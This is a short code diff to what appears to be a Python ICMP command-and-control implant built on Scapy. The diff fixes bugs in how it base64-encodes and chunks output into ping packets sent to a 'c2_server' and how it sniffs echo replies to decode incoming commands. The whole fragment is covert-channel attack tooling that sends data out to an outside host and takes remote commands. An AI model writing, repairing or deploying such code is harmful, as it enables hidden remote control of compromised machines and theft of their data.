@@ -17,9 +17,9 @@ def send_res(content):
 		payload = b64encode(content.encode('utf-8'))
 		payload_frag = [payload[i-chunk_size:i] for i in range(chunk_size, len(payload)+chunk_size, chunk_size)]
 		for frag in payload_frag:
-			packet=IP(dst=c2_server)/ICMP(type="echo-request")/frag
+			packet=IP(dst=c2_server)/ICMP(type="echo-request",id=1,seq=1)/frag
 			send(packet, verbose=False)
-			time.wait(1/50)
+			time.sleep(1/50)
 	except Exception as e:
 		print(e)
 		
@@ -52,7 +52,7 @@ def recieve_cmd():
 		while not stop:
 			rp = sniff(filter="icmp and icmp[0]=0", count=1)
 			send_mutex.acquire()
-			msg = b64decode(rp[0][Raw].load).decode('ascii')
+			msg = b64decode(rp[0][Raw].load).decode('utf-8')
 			handle_cmd(msg)
 			send_mutex.release()
 	except Exception as e:
